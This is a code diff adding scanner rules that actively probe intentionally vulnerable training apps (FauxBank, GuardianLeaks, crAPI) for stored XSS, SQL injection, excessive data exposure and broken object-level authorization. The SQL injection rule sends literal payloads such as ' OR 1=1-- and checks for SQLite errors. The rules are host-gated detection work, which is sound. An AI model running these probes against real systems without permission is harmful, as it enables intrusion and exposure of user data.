@@ -27675,6 +27675,23 @@ const fauxbankStoredXssSupportProbe: Rule = async (ctx) => {
   };
 };
 
+const fauxbankSupportRouteLiveOracle: Rule = async (ctx) => {
+  if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:api\/)?support\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await fauxbankStoredXssSupportProbe(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "FauxBank /api/support route scan — POST stores raw HTML and GET returns unescaped XSS payload in ticket body (lesson #3)"
+    }
+  };
+};
+
 const fauxbankLoansRequestLiveOracle: Rule = async (ctx) => {
   if (!looksLikeFauxbankLab(ctx.origin, ctx.combined, ctx.scanUrl)) return NEGATIVE;
   const cookie = await ensureFauxbankSession(ctx);
@@ -38060,6 +38077,61 @@ const pentestGroundGuardianLeaksCreateSsrfRouteLiveOracle: Rule = async (ctx) =>
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Pentest-Ground GuardianLeaks /create route scan — POST reference= fetches AWS IMDS metadata — SSRF route oracle"
+    }
+  };
+};
+
+const pentestGroundGuardianLeaksSearchSqliLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundGuardianLeaksHost(ctx)) return NEGATIVE;
+  const searchUrl = new URL("/search", pentestGroundGuardianLeaksProbeOrigin(ctx)).toString();
+  const errorDoc = await ctx.probe.get(searchUrl, {
+    method: "POST",
+    body: "query=test'",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (errorDoc.status < 400 || !/sqlite3\.OperationalError|unrecognized token/i.test(errorDoc.body)) {
+    return NEGATIVE;
+  }
+  const unionDoc = await ctx.probe.get(searchUrl, {
+    method: "POST",
+    body: "query=' OR 1=1--",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (unionDoc.status < 200 || unionDoc.status >= 400) return NEGATIVE;
+  const postLinks = [...unionDoc.body.matchAll(/href\s*=\s*["']\/post\/\d+["']/gi)];
+  if (postLinks.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: searchUrl,
+      payload: "query=test' / ' OR 1=1--",
+      postCount: postLinks.length,
+      snippet:
+        errorDoc.body.match(/sqlite3\.OperationalError[^<]*/i)?.[0]?.slice(0, 160) ??
+        unionDoc.body.slice(0, 200),
+      note: "Pentest-Ground GuardianLeaks POST /search query= is concatenated into SQLite — test' raises OperationalError and ' OR 1=1-- returns multiple /post/ links — SQL injection oracle"
+    }
+  };
+};
+
+const pentestGroundGuardianLeaksSearchSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundGuardianLeaksHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/search\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pentestGroundGuardianLeaksSearchSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pentest-Ground GuardianLeaks /search route scan — POST query= triggers SQLite OperationalError and boolean OR bypass lists multiple posts — SQL injection route oracle"
     }
   };
 };
@@ -63535,6 +63607,78 @@ const crapiVehicleRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const crapiDashboardLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  if (isCrapiAuthRoute(ctx)) return NEGATIVE;
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const dashboardUrl = new URL("/identity/api/v2/user/dashboard", ctx.origin).toString();
+  const doc = await ctx.probe.get(dashboardUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${jwt}` }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  try {
+    const parsed = JSON.parse(doc.body) as {
+      email?: string;
+      name?: string;
+      number?: string;
+      available_credit?: number;
+      role?: string;
+    };
+    if (!parsed.email || !parsed.name || parsed.available_credit === undefined) return NEGATIVE;
+    return {
+      fired: true,
+      confidence: 0.9,
+      evidence: {
+        dashboardUrl,
+        email: parsed.email,
+        availableCredit: parsed.available_credit,
+        role: parsed.role,
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "crAPI GET /identity/api/v2/user/dashboard returns authenticated user profile with email, phone number, and available_credit — excessive data exposure oracle (API3)"
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const crapiDashboardRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/user\/dashboard\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiDashboardLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /identity/api/v2/user/dashboard route scan — authenticated GET returns email, phone number, and available_credit — excessive data exposure route oracle (API3)"
+    }
+  };
+};
+
+const crapiCommunityPostsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapiLabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/community\/api\/v2\/community\/posts\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await crapiVehicleBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "crAPI /community/api/v2/community/posts route scan — community vehicleid leak enables cross-user location read — BOLA route oracle (API1)"
+    }
+  };
+};
+
 const crapiSignupOpenRegistrationLiveOracle: Rule = async (ctx) => {
   if (!isCrapi1Host(ctx)) return NEGATIVE;
   const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
@@ -68743,6 +68887,7 @@ export const RULES: Record<string, Rule> = {
   fauxbankIdorAccountsProbe,
   fauxbankCsrfTransferProbe,
   fauxbankStoredXssSupportProbe,
+  fauxbankSupportRouteLiveOracle,
   fauxbankLoansRequestLiveOracle,
   fauxbankLoansNegativeAmountLiveOracle,
   fauxbankAdminPanelLiveOracle,
@@ -69289,6 +69434,8 @@ export const RULES: Record<string, Rule> = {
   clientSidePentestGroundGuardianLeaksEvidence,
   pentestGroundGuardianLeaksCreateSsrfLiveOracle,
   pentestGroundGuardianLeaksCreateSsrfRouteLiveOracle,
+  pentestGroundGuardianLeaksSearchSqliLiveOracle,
+  pentestGroundGuardianLeaksSearchSqliRouteLiveOracle,
   clientSidePentestGroundHubEvidence,
   pentestGroundDvwaExecCmdiRouteLiveOracle,
   pentestGroundDvwaCspBypassRouteLiveOracle,
@@ -69717,6 +69864,9 @@ export const RULES: Record<string, Rule> = {
   crapiMechanicReportRouteLiveOracle,
   crapiVehicleBolaLiveOracle,
   crapiVehicleRouteLiveOracle,
+  crapiDashboardLiveOracle,
+  crapiDashboardRouteLiveOracle,
+  crapiCommunityPostsRouteLiveOracle,
   crapiSignupOpenRegistrationLiveOracle,
   crapiSignupRouteLiveOracle,
   crapiOtpBruteforceLiveOracle,
